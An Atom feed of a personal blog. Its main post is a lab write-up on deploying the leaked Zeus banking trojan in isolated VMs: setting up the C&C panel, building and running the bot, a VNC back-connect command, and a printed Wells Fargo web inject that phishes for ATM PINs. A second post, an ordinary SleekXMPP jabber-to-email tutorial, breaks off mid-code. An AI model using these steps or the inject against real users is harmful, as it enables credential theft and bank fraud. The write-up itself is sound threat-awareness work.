<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: bot | #!/slash/note]]></title>
  <link href="http://leonjza.github.io/blog/categories/bot/atom.xml" rel="self"/>
  <link href="http://leonjza.github.io/"/>
  <updated>2015-08-21T07:43:21+02:00</updated>
  <id>http://leonjza.github.io/</id>
  <author>
    <name><![CDATA[Leon Jacobs]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Zeus - My Adventure with a Infamous Bot]]></title>
    <link href="http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/"/>
    <updated>2013-09-23T14:21:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot</id>
    <content type="html"><![CDATA[<h6>var disclaimer = require(&lsquo;standard_disclaimer.js&rsquo;);</h6>

<p><strong>NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET AND A ANGRY NATIVE WITH A BIG STICK &ndash; ALONE</strong></p>

<h3>Bots for the masses.</h3>

<p>Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not <strong>100%</strong> aware of how ( and I dare say this lightly ) <em>easy</em> they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.</p>

<!--more-->


<h3>So, botnet?</h3>

<p>In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">Zeus botnet</a>. Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra <em>features</em> that you&rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.</p>

<p>So for $700, you can buy a relatively easy to setup piece of software that would allow you to <em>steal</em> credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">here</a> does a excellent job to describe the process in a image:</p>

<p><img class="<a" src="href="http://upload.wikimedia.org/wikipedia/en/2/2d/FBI_Fraud_Scheme_Zeus_Trojan.jpg">http://upload.wikimedia.org/wikipedia/en/2/2d/FBI_Fraud_Scheme_Zeus_Trojan.jpg</a>"></p>

<h3>The Zeus Bot Architecture</h3>

<p>The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a <a href="http://en.wikipedia.org/wiki/Drive-by_download">drive-by download</a> (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.</p>

<p>Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.</p>

<h3>Zeus Source Leaked</h3>

<p>The full Zeus bot sources <a href="https://www.csis.dk/en/csis/blog/3229/">leaked</a> around March 2011, and a Github repo of it was made <a href="https://github.com/Visgean/Zeus">here</a>. This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors' business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&amp;C servers instead of relying on HTTP as can be seen in <a href="http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf">this</a> excellent analysis by <a href="https://twitter.com/CERT_Polska_en">@CERT_Polska_en</a>.</p>

<h3>LAB Time!</h3>

<p>Now that we have the full sources, I decided it&rsquo;s time to setup a LAB to configure and play with this bot.</p>

<p>I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this &ldquo;Fake Internet&rdquo;. I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.</p>

<p>In short, the lab was going to look something like this:
```bash Internal Zeus LAB</p>

<pre><code>                     Virtual Machine Management Interface
                     +-----------------------------------&gt;
                               |
                               |
                               |
                          +----+---------+
                          |              |
              +-----------+  Firewall    +-----------+
              |           |              |           |
              |           +--------------+           |
              |                                      |                 +----------+
              |                  ^                   |              +--| Victim A |
      +---------------+          |           +----------------+     |  +----------+
      |               |          |           |                |     |
      | Fake Internet |          +           |   Fake LAN     +-----+  +----------+
      |               |                      |                |     +--+ Victim B |
      +------+--------+   NAT Towards Fake   +----------------+        +----------+
             |            Internet Interface
             |
    +--------+--------+--------------------+----------------+
    |                 |                    |                |
    |                 |                    |                |
    |                 |                    |                +
</code></pre>

<p> +&mdash;&mdash;&mdash;+&mdash;&mdash;&ndash;+     +&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;+      +&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+     +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
 |            |     |            |      |              |     |                 |
 | Zeus Bot   |     | Zeus Web   |      | Random Victim|     | Compromised     |
 | Herder /   |     | based C&amp;C  |      |              |     | Web Server      |
 | Controller |     |            |      |              |     |                 |
 +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+     +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+      +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+     +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<h3>The Configuration</h3>

<h4>Command &amp; Control</h4>

<p>I figured I&rsquo;d start by checking out the code from the <a href="https://github.com/Visgean/Zeus/">git</a> repo onto the server I would use as the command and control server. So, off I went and <code>git clone https://github.com/Visgean/Zeus.git</code>&rsquo;d the Zeus code into a local directory of my C&amp;C server.</p>

<p>The folder structure of the directory <code>output</code> that is of interest, on disk, looked something like this:</p>

<p>```bash Zeus Sources FOlder Structure
Zeus/output
├── builder
├── other
├── server
└── server[php]</p>

<pre><code>├── install
├── system
└── theme
</code></pre>

<p>```</p>

<p>We can see there is a <code>server[php]</code> directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index <code>index.php</code> is in fact empty. So, should someone stumble upon the C&amp;C directory, a blank page will be displayed to the user.</p>

<p>Two other files also exist in the php server root, namely <code>cp.php</code> and <code>gate.php</code>. <code>cp.php</code> is the user control panel to manage the bots, whereas <code>gate.php</code> is the script that all the bots will use to communicate with the C&amp;C. That being said, inspecting network traffic should reveal a lot of talking with <code>gate.php</code>. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)</p>

<p>So, I copied the sources for <code>server[php]</code> to a web folder <code>z/</code>, fixed up the SELinux contexts for them and tried to access the <code>cp.php</code> page. Bam, server error.</p>

<p><code>bash Zeus cp.php mb_internal_encoding error
[Mon Sep 23 10:57:45 2013] [error] [client 172.16.50.1] PHP Fatal error:  Call to undefined function mb_internal_encoding() in /var/www/html/z/system/global.php on line 1
</code></p>

<p>It was pretty obvious I was missing <code>php-mbstring</code>, so I went and installed it and restarted Apache. Now, loading my <code>cp.php</code>, I was greeted with a polite message asking me how I am :D</p>

<p><img class="<a" src="href="http://i.imgur.com/cCgsLBk.png">http://i.imgur.com/cCgsLBk.png</a>"></p>

<h4>Installing the Command &amp; Control</h4>

<p>I noticed a install folder in the obtained sources and browsed to <code>install/</code> and found a very nice, easy to understand installer:</p>

<p><img class="<a" src="href="http://i.imgur.com/e1fYvPG.png">http://i.imgur.com/e1fYvPG.png</a>"></p>

<p>Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database <code>cpdb</code> for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.</p>

<p><img class="<a" src="href="http://i.imgur.com/La5zzZI.png">http://i.imgur.com/La5zzZI.png</a>"></p>

<h4>Compiling the Bot</h4>

<p>With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.</p>

<p>Next, I browsed to the <code>output/builder/</code> folder again and opened the <code>config.txt</code> file in notepad. Here, I really had to set minimal options. One to specify the location of the <code>config.bin</code> and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the <code>encryption_key</code>, which should correspond to the key used when we installed the server side PHP stuff earlier.</p>

<p><img class="<a" src="href="http://i.imgur.com/xQQeqQl.png">http://i.imgur.com/xQQeqQl.png</a>"></p>

<p>The next step was to <em>compile</em> the bot. While this may sound complex, it&rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The <strong>compiler</strong> interface looked like this:</p>

<p><img class="<a" src="href="http://i.imgur.com/f13Baez.png">http://i.imgur.com/f13Baez.png</a>"></p>

<p>1,2,3 done. We now have a <code>zeus-bot.exe</code>. The malware is now customized to speak to my Command &amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.</p>

<h3>Skipping the creative parts &ndash; Infection.</h3>

<p>From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn&rsquo;t work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.</p>

<p>Sadly, I wanted to test the <a href="http://en.wikipedia.org/wiki/Blackhole_exploit_kit">Blackhole Exploit Kit</a>, but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP&rsquo;s along with time restrictions the works. Just like something you&rsquo;d expect to see in commercial software.</p>

<p>As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded <code>zeus-bot.exe</code> and the encrypted <code>config.bin</code> to a fake <strong>compromised web server</strong>, ready for download.</p>

<p>I opened Internet Explorer and browsed to the location of <code>zeus-bot.exe</code> and chose <strong>RUN</strong>. To the unsuspecting user, it will appear that nothing happened&hellip;</p>

<h3>From the Bot Herders Perspective</h3>

<p>Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command &amp; Control server. We can see this in the interface, as well as based on the POST requests to <code>gate.php</code></p>

<p><code>bash Apache Logs Extract for POST's to gate.php
172.16.50.2 - - [19/Sep/2013:10:58:01 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:06 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:12 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:17 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:22 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:00 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:05 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:10 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:15 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:20 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:23 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:28 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:34 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:39 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:44 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:20 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:25 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:30 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:35 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:40 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:45 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:50 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:56 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:01 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:07 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:40 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:45 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:50 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:55 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
</code></p>

<p>We are also able to, using the control panel, see some more information based on the newly connected bot:</p>

<p><img class="<a" src="href="http://i.imgur.com/aKe4kJh.png">http://i.imgur.com/aKe4kJh.png</a>"></p>

<p>An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an <em>almost live</em> image. On the client, we can see that the process <code>explorer.exe</code> is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.</p>

<p><img class="<a" src="href="http://i.imgur.com/fiy0u2N.png">http://i.imgur.com/fiy0u2N.png</a>"></p>

<p>In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.</p>

<p>So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp; Control server <strong>will</strong> be able to connect to. The result?</p>

<p><img class="<a" src="href="http://i.imgur.com/GMqlVCM.png">http://i.imgur.com/GMqlVCM.png</a>"></p>

<p>There is <strong>no</strong> visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.</p>

<h4>But thats not all</h4>

<p>Just being able to <em>see</em> what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won&rsquo;t know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use <strong>your</strong> machine to steal <strong>your</strong> money. From the banks perspective this may appear like a perfectly legitimate transaction.</p>

<p>So lets see how this VNC functionality works.</p>

<h4>Execute the VNC BC Script</h4>

<p>First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.</p>

<p>In short, the setup will look something like this.</p>

<p>```bash Back Connect Server
   &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;>        &lt;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
   &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;>        &lt;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>

<p>   +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+      +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+   +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
   |  Attacker  +&mdash;&mdash;&mdash;>  Back Connect Server  &lt;&mdash;+ LAN Firewall &lt;&mdash;&ndash;+ Infected Machine |
   +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+      +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+   +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you&rsquo;d only see the connection going out to the back connect server, and not the real attacker. The server executable is <code>zsbcs.exe</code> in the <code>output/server/</code> directory and is a windows only tool.</p>

<p>Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:</p>

<p><code>bash Back Connect Script
bot_bc_add vnc 172.16.50.181 9000
</code></p>

<p>This tells the bot where to connect to wait for a VNC session.</p>

<p>Next, the attacker can sit and watch hes Back Connect Server&rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate <strong>display</strong>, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&rsquo;s almost as if hes attaching to another <em>tty</em>.</p>

<p><img class="<a" src="href="http://i.imgur.com/7tg4l2X.png">http://i.imgur.com/7tg4l2X.png</a>"></p>

<h3>Web Injects, the real threat.</h3>

<p>So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called <strong>Web Injects</strong> to manipulate website content. &ldquo;What do you mean by &lsquo;manipulation&rsquo;?&rdquo; you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command &amp; Control server. Just like the one we just used to Remotely Administer the infected machines.</p>

<p>With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.</p>

<h4>How it works</h4>

<p>When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API&rsquo;s in Windows, it is able to monitor for its configured URL&rsquo;s, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source <a href="https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63">here</a>.</p>

<p>```html Wellsfargo Web Inject
set_url <a href="https://www.wellsfargo.com/*">https://www.wellsfargo.com/*</a> G
data_before
<span class="mozcloak"><input type="password"*</span>
data_end
data_inject</p>

<br><strong><label for="atmpin">ATM PIN</label>:</strong>&nbsp;<br />


<p><span class="mozcloak"><input type="password" accesskey="A" id="atmpin" name="USpass" size="13" maxlength="14" style="width:147px" tabindex="2" /></span>
data_end
data_after
data_end
```</p>

<p>In the above extract from the web injects we can see that the http<strong>s</strong>://wellsfargo.com (note the s) website will have a extra field added, asking for a <em>ATM PIN</em> before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;C.</p>

<p><img class="<a" src="href="http://npercoco.typepad.com/.a/6a0133f264aa62970b01910426b229970c-pi">http://npercoco.typepad.com/.a/6a0133f264aa62970b01910426b229970c-pi</a>"></p>

<h3>Summary</h3>

<p>While Zeus itself is old news and many variants such as <a href="http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf">Citadel</a> have sprung up, I believe this is still a very valid threat as the concepts remain the same.</p>

<p>A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Jabber to Email using SleekXMPP]]></title>
    <link href="http://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp/"/>
    <updated>2013-06-07T10:48:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp</id>
    <content type="html"><![CDATA[<h3>So, why would you even want this..?</h3>

<p>Well, to be honest, I am not really sure of many use cases for this, however maybe someone, somewhere will need to do something like this, and I would have done my deed and saved someone some time ::sun::</p>

<h3>Introducing SleekXMPP</h3>

<p><a href="http://sleekxmpp.com/">SleekXMPP</a> is a python XMPP framework. It takes a bit to get your head around it, but once you have some basics covered its quite a rewarding library to work with. :) To start, you need to install 2 dependencies. Python Mailer and SleekXMPP itself. Something like <code>pip install mailer sleekxmpp</code> or for the older school, <code>easy_install sleekxmpp mailer</code> should do the trick. It can&rsquo;t hurt to check if the distro you use has these are packages already too.</p>

<!--more-->


<h3>Configuration and testing time</h3>

<p>Once the install completes, do a quick check to see if everything is ok, Try to import the modules. They should return no errors. If they do, check that the installation of the previously mentioned dependencies were successful.</p>

<p>```python Check dependencies
% python2
Python 2.7.5 (default, May 12 2013, 12:00:47)
[GCC 4.8.0 20130502 (prerelease)] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>import sleekxmpp
import mailer</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>Next, you need a <em>bot</em> account to use. Provision a user on your jabber server for the bot and test with a jabber client that it works.</p>

<h3>Ok, code</h3>

<p>Next, we take the <a href="http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot">sample</a> echobot from the SleekXMPP website, and modify it slightly to handle our incoming message by sending a email, instead of simply replying back what we have sent.</p>

<p>First, we import the mailer requirements with:</p>

<p>```python mailer imports</p>

<p>from mailer import Mailer
from mailer import Message
```</p>

<p>The above can be placed right after the option parser has been imported. Then, we only need to change the <code>message</code> method within the <code>EchoBot</code> class really:</p>

<p>```python Shameless SleekXMPP modification of the echobot <a href="http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot">http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot</a></p>

<h1>!/usr/bin/env python</h1>

<p>if msg[&lsquo;type&rsquo;] in (&lsquo;chat&rsquo;, &lsquo;normal&rsquo;):</p>

<p>   print &ldquo;Received Message:\n%(body)s&rdquo; % msg</p>

<p>   # Mail the message Received
   message = Message(From=&ldquo;&lsquo;Jabber Email Service&rsquo; <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x73;&#111;&#109;&#101;&#x6f;&#110;&#x65;&#x40;&#x64;&#111;&#x6d;&#x61;&#x69;&#x6e;&#x2e;&#x63;&#111;&#x6d;">&#x73;&#111;&#109;&#101;&#x6f;&#110;&#101;&#x40;&#100;&#x6f;&#109;&#x61;&#x69;&#110;&#x2e;&#x63;&#111;&#109;</a>&rdquo;,</p>

<pre><code>     To=["someone@domain.com"],
     Subject="[Jabber Message Received] From: %s" % msg["from"])
</code></pre>

<p>   themessage = msg[&ldquo;body&rdquo;]
   themessage = themessage.decode(&lsquo;unicode_escape&rsquo;).encode(&lsquo;ascii&rsquo;,&lsquo;ignore&rsquo;)
   message.Body = themessage</p>

<p>   sender = Mailer(&ldquo;127.0.0.1&rdquo;)
   sender.send(message)
```</p>

<p>A complete modified example that includes the above changes:</p>

<p>```python Shameless SleekXMPP modification of the echobot <a href="http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot">http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot</a></p>

<h1>!/usr/bin/env python</h1>

<h1>&ndash;<em>&ndash; coding: utf-8 &ndash;</em>&ndash;</h1>

<p>&ldquo;&rdquo;"</p>

<pre><code>SleekXMPP: The Sleek XMPP Library
Copyright (C) 2010  Nathanael C. Fritz
This file is part of SleekXMPP.

See the file LICENSE for copying permission.
</code></pre>

<p>&ldquo;&rdquo;"</p>

<p>import sys
import logging
import getpass
from optparse import OptionParser</p>

<p>from mailer import Mailer
from mailer import Message</p>

<p>import sleekxmpp</p>

<h1>Python versions before 3.0 do not use UTF-8 encoding</h1>

<h1>by default. To ensure that Unicode is handled properly</h1>

<h1>throughout SleekXMPP, we will set the default encoding</h1>

<h1>ourselves to UTF-8.</h1>

<p>if sys.version_info &lt; (3, 0):</p>

<pre><code>reload(sys)
sys.setdefaultencoding('utf8')
</code></pre>

<p>else:</p>

<pre><code>raw_input = input
</code></pre>

<p>class EchoBot(sleekxmpp.ClientXMPP):</p>

<pre><code>"""
A simple SleekXMPP bot that will echo messages it
receives, along with a short thank you message.
"""

def __init__(self, jid, password):
    sleekxmpp.ClientXMPP.__init__(self, jid, password)

    # The session_start event will be triggered when
    # the bot establishes its connection with the server
    # and the XML streams are ready for use. We want to
    # listen for this event so that we we can initialize
    # our roster.
    self.add_event_handler("session_start", self.start)

    # The message event is triggered whenever a message
    # stanza is received. Be aware that that includes
    # MUC messages and error messages.
    self.add_event_handler("message", self.message)

def start(self, event):
    """
    Process the session_start event.

    Typical actions for the session_start event are
    requesting the roster and broadcasting an initial
    presence stanza.

    Arguments:
        event -- An empty dictionary. The session_start
                 event does not provide any additional
                 data.
    """
    self.send_presence()
    self.get_roster()
    self.nick = "jabberMailBot"

def message(self, msg):
    """
    Process incoming message stanzas. Be aware that this also
    includes MUC messages and error messages. It is usually
    a good idea to check the messages's type before processing
    or sending replies.

    Arguments:
        msg -- The received message stanza. See the documentation
               for stanza objects and the Message stanza to see
               how it may be used.
    """
    if msg['type'] in ('chat', 'normal'):

        print "Received Message:\n%(body)s" % msg

        # Mail the message Received
        message = Message(From="'Jabber Email Service' &lt;someone@domain.com&gt;",
              To=["someone@domain.com"],
              Subject="[Jabber Message Received] From: %s" % msg["from"])
        themessage = msg["body"]
